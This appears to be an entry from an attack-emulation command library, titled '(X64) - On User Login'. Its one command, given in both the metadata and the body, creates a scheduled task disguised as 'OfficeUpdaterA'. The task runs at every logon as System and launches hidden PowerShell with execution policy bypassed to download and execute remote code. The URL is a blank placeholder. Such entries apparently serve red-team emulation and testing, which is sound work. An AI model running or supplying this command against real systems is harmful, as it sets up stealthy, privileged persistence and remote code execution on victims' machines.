---
id: 7ef2b4b2-fbf1-4161-a265-bedf1404efae
name: (X64) - On User Login
type: command
executor: bash
data: 'schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
  -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object
  net.webclient).downloadstring(''''''http:///''''''))''" /sc onlogon /ru System

  '
output: null
created_at: '2020-07-14T18:21:10.246683+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# (X64) - On User Login

```bash
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onlogon /ru System

```


